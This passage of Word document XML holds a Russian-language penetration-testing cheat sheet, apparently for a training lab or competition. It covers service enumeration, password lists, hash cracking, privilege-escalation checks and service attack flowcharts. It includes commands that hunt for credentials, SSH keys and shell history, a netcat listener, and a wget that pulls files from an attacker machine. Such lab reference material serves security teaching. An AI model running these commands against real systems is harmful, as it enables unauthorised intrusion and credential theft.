        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>14. SNMP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sU -p161 --script snmp-info TARGET</w:t>
        <w:br/>
        <w:t>snmpwalk -v2c -c public TARGET</w:t>
        <w:br/>
        <w:t>onesixtyone TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Типовые community strings для разрешённого стенда: public, private, manager, monitor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>15. MySQL / PostgreSQL / LDAP / RDP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>15.1. MySQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sC -sV -p3306 TARGET</w:t>
        <w:br/>
        <w:t>mysql -h TARGET -u root -p</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>15.2. PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sV -p5432 TARGET</w:t>
        <w:br/>
        <w:t>psql -h TARGET -U postgres</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>15.3. LDAP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sV -p389,636 TARGET</w:t>
        <w:br/>
        <w:t>ldapsearch -x -H ldap://TARGET -s base</w:t>
        <w:br/>
        <w:t xml:space="preserve">ldapsearch -x -H ldap://TARGET -b "dc=example,dc=local" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>15.4. RDP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nmap -sV -p3389 TARGET</w:t>
        <w:br/>
        <w:t>xfreerdp /v:TARGET /u:USER</w:t>
        <w:br/>
        <w:t>xfreerdp /v:TARGET /u:USER /p:'PASSWORD'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>16. Password Attacks и wordlists</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16.1. Приоритет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>1. Default credentials</w:t>
        <w:br/>
        <w:t>2. Top 100</w:t>
        <w:br/>
        <w:t>3. Top 1000</w:t>
        <w:br/>
        <w:t>4. Top 10000</w:t>
        <w:br/>
        <w:t>5. Target-specific words</w:t>
        <w:br/>
        <w:t>6. RockYou</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16.2. Username list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nano users.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t>root</w:t>
        <w:br/>
        <w:t>admin</w:t>
        <w:br/>
        <w:t>administrator</w:t>
        <w:br/>
        <w:t>user</w:t>
        <w:br/>
        <w:t>test</w:t>
        <w:br/>
        <w:t>dev</w:t>
        <w:br/>
        <w:t>developer</w:t>
        <w:br/>
        <w:t>operator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16.3. Небольшой password list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nano passwords.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t>password</w:t>
        <w:br/>
        <w:t>Password</w:t>
        <w:br/>
        <w:t>123456</w:t>
        <w:br/>
        <w:t>admin</w:t>
        <w:br/>
        <w:t>admin123</w:t>
        <w:br/>
        <w:t>qwerty</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16.4. Target-specific words</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># Пример для учебного стенда:</w:t>
        <w:br/>
        <w:t>rtk</w:t>
        <w:br/>
        <w:t>RTK</w:t>
        <w:br/>
        <w:t>rtk123</w:t>
        <w:br/>
        <w:t>RTK123</w:t>
        <w:br/>
        <w:t>rtk2026</w:t>
        <w:br/>
        <w:t>RTK2026</w:t>
        <w:br/>
        <w:t>Password123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16.5. CeWL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>cewl http://TARGET -w company_words.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16.6. Crunch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Используй crunch только когда известна структура пароля и это оправдано задачей. Не запускай огромный полный перебор без оценки пространства поиска.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>17. Hash cracking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>17.1. Определение типа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>hashid 'HASH'</w:t>
        <w:br/>
        <w:t>hash-identifier</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>17.2. John</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>echo 'HASH' &gt; hash.txt</w:t>
        <w:br/>
        <w:t>john hash.txt</w:t>
        <w:br/>
        <w:t>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</w:t>
        <w:br/>
        <w:t>john --show hash.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>17.3. Hashcat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>hashcat --example-hashes</w:t>
        <w:br/>
        <w:t>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</w:t>
        <w:br/>
        <w:t>hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</w:t>
        <w:br/>
        <w:t>hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</w:t>
        <w:br/>
        <w:t>hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Mode зависит от фактического формата hash. Всегда проверяй режим перед запуском.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>18. Linux Initial Access → Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>id</w:t>
        <w:br/>
        <w:t>whoami</w:t>
        <w:br/>
        <w:t>hostname</w:t>
        <w:br/>
        <w:t>uname -a</w:t>
        <w:br/>
        <w:t>cat /etc/os-release</w:t>
        <w:br/>
        <w:t>ip a</w:t>
        <w:br/>
        <w:t>ip route</w:t>
        <w:br/>
        <w:t>ss -lntup</w:t>
        <w:br/>
        <w:t>ps auxf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18.1. Пользователи и группы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>cat /etc/passwd</w:t>
        <w:br/>
        <w:t>cat /etc/group</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18.2. Sudo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18.3. SUID / SGID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>find / -perm -4000 -type f 2&gt;/dev/null</w:t>
        <w:br/>
        <w:t>find / -perm -2000 -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18.4. Capabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>getcap -r / 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18.5. Cron</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>cat /etc/crontab</w:t>
        <w:br/>
        <w:t>ls -la /etc/cron*</w:t>
        <w:br/>
        <w:t>crontab -l</w:t>
        <w:br/>
        <w:t>find /etc/cron* -type f -ls 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18.6. Writable files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>find /etc /opt /usr/local -writable -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>19. Linux secrets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>grep -RniE 'password|passwd|pwd|secret|token|api_key|apikey' /etc /opt /var/www 2&gt;/dev/null</w:t>
        <w:br/>
        <w:br/>
        <w:t>find /var/www /opt /etc -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.env" -o -name "*.yaml" -o -name "*.yml" \) 2&gt;/dev/null</w:t>
        <w:br/>
        <w:br/>
        <w:t>history</w:t>
        <w:br/>
        <w:t>cat ~/.bash_history 2&gt;/dev/null</w:t>
        <w:br/>
        <w:br/>
        <w:t>find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>20. Linux Privilege Escalation — быстрый чек</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>id</w:t>
        <w:br/>
        <w:t>sudo -l</w:t>
        <w:br/>
        <w:t>ss -lntup</w:t>
        <w:br/>
        <w:t>ps auxf</w:t>
        <w:br/>
        <w:t>find / -perm -4000 -type f 2&gt;/dev/null</w:t>
        <w:br/>
        <w:t>getcap -r / 2&gt;/dev/null</w:t>
        <w:br/>
        <w:t>cat /etc/crontab</w:t>
        <w:br/>
        <w:t>find /etc /opt /usr/local -writable -type f 2&gt;/dev/null</w:t>
        <w:br/>
        <w:t>grep -RniE 'password|passwd|secret|token' /etc /opt /var/www 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Если условия соревнования разрешают, можно дополнительно использовать linPEAS. Но сначала умей выполнять базовую enumeration вручную.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>21. Windows — первичная enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>whoami</w:t>
        <w:br/>
        <w:t>hostname</w:t>
        <w:br/>
        <w:t>ipconfig /all</w:t>
        <w:br/>
        <w:t>route print</w:t>
        <w:br/>
        <w:t>net user</w:t>
        <w:br/>
        <w:t>net localgroup</w:t>
        <w:br/>
        <w:t>systeminfo</w:t>
        <w:br/>
        <w:t>tasklist</w:t>
        <w:br/>
        <w:t>netstat -ano</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>21.1. Privilege checks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>whoami /priv</w:t>
        <w:br/>
        <w:t>whoami /groups</w:t>
        <w:br/>
        <w:t>systeminfo</w:t>
        <w:br/>
        <w:t>sc query</w:t>
        <w:br/>
        <w:t>schtasks /query /fo LIST /v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ищи конфигурационные файлы, скрипты, PowerShell history, IIS/application configs, backup-файлы, сетевые shares и доступные credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>22. Searchsploit / Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>searchsploit "Apache 2.4"</w:t>
        <w:br/>
        <w:t>searchsploit "vsftpd"</w:t>
        <w:br/>
        <w:t>searchsploit "Samba"</w:t>
        <w:br/>
        <w:br/>
        <w:t>msfconsole</w:t>
        <w:br/>
        <w:t>search apache</w:t>
        <w:br/>
        <w:t>show options</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Версия сервиса сама по себе не доказывает уязвимость. Подтверждай точную версию, конфигурацию и условия эксплуатации.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>23. Git / backup / config</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl http://TARGET/.git/HEAD</w:t>
        <w:br/>
        <w:br/>
        <w:t># Полезные цели:</w:t>
        <w:br/>
        <w:t>backup</w:t>
        <w:br/>
        <w:t>backup.zip</w:t>
        <w:br/>
        <w:t>site.zip</w:t>
        <w:br/>
        <w:t>www.zip</w:t>
        <w:br/>
        <w:t>database.sql</w:t>
        <w:br/>
        <w:t>dump.sql</w:t>
        <w:br/>
        <w:t>config.php.bak</w:t>
        <w:br/>
        <w:t>config.php.old</w:t>
        <w:br/>
        <w:t>.env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Если найден исходный код или конфигурация, ищи password, secret, token, API key, database credentials и usernames.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>24. Netcat / передача файлов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>nc -lvnp 4444</w:t>
        <w:br/>
        <w:t>nc TARGET 4444</w:t>
        <w:br/>
        <w:t>nc -zv TARGET 22</w:t>
        <w:br/>
        <w:br/>
        <w:t>python3 -m http.server 8000</w:t>
        <w:br/>
        <w:t>wget http://KALI_IP:8000/file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>25. Curl — быстрые запросы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl http://TARGET</w:t>
        <w:br/>
        <w:t>curl -I http://TARGET</w:t>
        <w:br/>
        <w:t>curl -v http://TARGET</w:t>
        <w:br/>
        <w:t>curl -X POST -d 'username=admin&amp;password=test' http://TARGET/login</w:t>
        <w:br/>
        <w:t>curl -b 'session=VALUE' http://TARGET/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>26. Основные порты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>20/21    FTP</w:t>
        <w:br/>
        <w:t>22       SSH</w:t>
        <w:br/>
        <w:t>23       Telnet</w:t>
        <w:br/>
        <w:t>25       SMTP</w:t>
        <w:br/>
        <w:t>53       DNS</w:t>
        <w:br/>
        <w:t>67/68    DHCP</w:t>
        <w:br/>
        <w:t>80       HTTP</w:t>
        <w:br/>
        <w:t>110      POP3</w:t>
        <w:br/>
        <w:t>111      RPC</w:t>
        <w:br/>
        <w:t>135      MSRPC</w:t>
        <w:br/>
        <w:t>139      NetBIOS/SMB</w:t>
        <w:br/>
        <w:t>143      IMAP</w:t>
        <w:br/>
        <w:t>161      SNMP</w:t>
        <w:br/>
        <w:t>389      LDAP</w:t>
        <w:br/>
        <w:t>443      HTTPS</w:t>
        <w:br/>
        <w:t>445      SMB</w:t>
        <w:br/>
        <w:t>465      SMTPS</w:t>
        <w:br/>
        <w:t>587      SMTP</w:t>
        <w:br/>
        <w:t>636      LDAPS</w:t>
        <w:br/>
        <w:t>993      IMAPS</w:t>
        <w:br/>
        <w:t>995      POP3S</w:t>
        <w:br/>
        <w:t>1433     MSSQL</w:t>
        <w:br/>
        <w:t>1521     Oracle</w:t>
        <w:br/>
        <w:t>2049     NFS</w:t>
        <w:br/>
        <w:t>3306     MySQL</w:t>
        <w:br/>
        <w:t>3389     RDP</w:t>
        <w:br/>
        <w:t>5432     PostgreSQL</w:t>
        <w:br/>
        <w:t>5900     VNC</w:t>
        <w:br/>
        <w:t>5985     WinRM</w:t>
        <w:br/>
        <w:t>6379     Redis</w:t>
        <w:br/>
        <w:t>8080     HTTP/Web</w:t>
        <w:br/>
        <w:t>8443     HTTPS/Web</w:t>
        <w:br/>
        <w:t>9200     Elasticsearch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>27. Сценарии по сервисам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>27.1. Если найден SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>22</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>OpenSSH version</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>users / keys / password / default credentials</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>Hydra при необходимости</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>SSH access</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>sudo -l</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>SUID / capabilities / cron</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>credentials</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>27.2. Если найден SMB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>445</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>enum4linux-ng</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>shares</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>anonymous</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>users</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>files</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>credentials</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>SMB authentication</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>Windows enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>27.3. Если найден HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>80/443</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>curl</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>whatweb</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>robots.txt</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>ffuf/gobuster</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>directories/files</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>login/API</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>parameters/cookies</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>credentials</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>initial access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>27.4. Если найден FTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>21</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>anonymous</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>files</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>version</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>credentials</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>Hydra при необходимости</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>download</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>search secrets</w:t>
